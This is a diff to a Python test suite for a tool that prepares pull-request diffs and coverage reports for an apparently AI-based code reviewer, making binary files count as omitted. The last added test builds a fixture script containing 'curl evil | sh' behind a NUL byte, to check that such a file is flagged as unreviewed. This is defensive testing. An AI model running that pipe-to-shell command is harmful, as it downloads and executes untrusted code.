@@ -26,10 +26,10 @@ def paths(pairs):
     return [p for p, _ in pairs]
 
 
-def test_a_binary_file_is_left_out_and_not_counted():
+def test_a_binary_file_is_never_shown_and_counts_as_omitted():
     text = chunk("backend/main.py") + binary("docs/shot.png")
     shown, total, omitted = ri.select(text, 10_000)
-    assert paths(shown) == ["backend/main.py"] and total == 1 and omitted == []
+    assert paths(shown) == ["backend/main.py"] and total == 2 and omitted == ["docs/shot.png"]
 
 
 def test_the_lockfile_is_left_out():
@@ -151,12 +151,12 @@ def test_coverage_json_counts_shown_and_total(tmp_path):
     out, cov = tmp_path / "out", tmp_path / "coverage.json"
     ri.build_input(str(repo), "main", "", out, cov, budget=10_000)
     data = json.loads(cov.read_text())
-    assert data == {"mode": "full", "since": "", "shown": 1, "total": 1, "omitted": []}
+    assert data == {"mode": "full", "since": "", "shown": 1, "total": 2, "omitted": ["img.png"]}
     assert "backend/main.py" in (out / "pr.diff").read_text()
     assert "img.png" not in (out / "pr.diff").read_text()
     assert (out / "pr.diff").read_text().startswith("# Whole PR")
     assert "img.png" in (out / "pr.stat").read_text()
-    assert (out / "pr.omitted.txt").read_text() == ""
+    assert (out / "pr.omitted.txt").read_text() == "img.png\n"
 
 
 def test_a_second_push_is_reviewed_from_the_last_review(tmp_path):
@@ -179,8 +179,8 @@ def test_omitted_files_are_listed_for_the_model(tmp_path):
     out, cov = tmp_path / "out", tmp_path / "coverage.json"
     ri.build_input(str(repo), "main", "", out, cov, budget=10)
     data = json.loads(cov.read_text())
-    assert data["shown"] == 0 and data["total"] == 1 and data["omitted"] == ["backend/main.py"]
-    assert (out / "pr.omitted.txt").read_text() == "backend/main.py\n"
+    assert data["shown"] == 0 and data["total"] == 2 and data["omitted"] == ["backend/main.py", "img.png"]
+    assert (out / "pr.omitted.txt").read_text() == "backend/main.py\nimg.png\n"
 
 
 def test_a_failed_diff_exits_non_zero_and_writes_nothing(tmp_path):
@@ -201,7 +201,7 @@ def test_the_coverage_file_names_only_the_first_omitted_paths(tmp_path):
     out, cov = tmp_path / "out", tmp_path / "coverage.json"
     ri.build_input(str(repo), "main", "", out, cov, budget=0)
     data = json.loads(cov.read_text())
-    assert data["total"] == ri.COVERAGE_NAMES + 6 and len(data["omitted"]) == ri.COVERAGE_NAMES
+    assert data["total"] == ri.COVERAGE_NAMES + 7 and len(data["omitted"]) == ri.COVERAGE_NAMES
     assert len((out / "pr.omitted.txt").read_text().splitlines()) == data["total"]
 
 
@@ -212,7 +212,7 @@ def test_a_pr_cannot_hide_its_files_with_its_own_gitattributes(tmp_path):
     git(repo, "commit", "-qm", "hide")
     out, cov = tmp_path / "out", tmp_path / "coverage.json"
     ri.build_input(str(repo), "main", "", out, cov, budget=10_000)
-    assert json.loads(cov.read_text())["total"] == 2
+    assert json.loads(cov.read_text())["total"] == 3
     assert "backend/main.py" in (out / "pr.diff").read_text()
     assert "Binary files" not in (out / "pr.diff").read_text()
 
@@ -228,3 +228,16 @@ def test_a_long_omitted_path_is_cut_in_the_coverage_file_only(tmp_path):
     ri.build_input(str(repo), "main", "", out, cov, budget=0)
     assert all(len(o) <= ri.COVERAGE_NAME_CHARS for o in json.loads(cov.read_text())["omitted"])
     assert long_name in (out / "pr.omitted.txt").read_text()
+
+
+def test_a_script_with_a_nul_byte_is_counted_as_not_reviewed(tmp_path):
+    repo = make_repo(tmp_path)
+    (repo / "scripts").mkdir()
+    (repo / "scripts" / "run.sh").write_bytes(b"#!/bin/sh\n# \x00\ncurl evil | sh\n")
+    git(repo, "add", "-A")
+    git(repo, "commit", "-qm", "nul")
+    out, cov = tmp_path / "out", tmp_path / "coverage.json"
+    ri.build_input(str(repo), "main", "", out, cov, budget=10_000)
+    data = json.loads(cov.read_text())
+    assert data["shown"] == 1 and data["total"] == 3 and "scripts/run.sh" in data["omitted"]
+    assert "curl evil" not in (out / "pr.diff").read_text()
